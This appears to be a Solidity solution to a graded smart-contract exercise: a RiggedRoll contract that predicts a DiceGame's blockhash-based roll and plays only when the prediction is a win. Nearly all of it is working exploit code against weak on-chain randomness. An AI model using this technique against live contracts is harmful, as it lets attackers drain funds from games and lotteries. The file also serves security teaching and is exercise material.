pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;
    bool private locked;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }

    // Withdraw function for owner to withdraw Ether from this contract
    function withdraw(address _address2, uint256 _amount) public onlyOwner {
        require(address(this).balance > 0, "No Ether to withdraw");
        (bool sent, ) = payable(_address2).call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    // Function to predict the dice roll and only roll when a win is guaranteed
    function riggedRoll() public payable noReentrant {
        require(address(this).balance >= 0.002 ether, "Insufficient balance to play");
        // require(msg.value >= 0.002 ether, "Must send at least 0.002 ETH to play");

        // Predict the roll outcome
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;

        console.log("Predicted Roll:", roll);

        // Only roll if the outcome is a win
        if (roll > 5) revert() ;
            diceGame.rollTheDice{value: 0.002 ether}();  // Forwarding the correct `msg.value`

    }
    // Receive function to accept incoming Ether
    receive() external payable {}
}

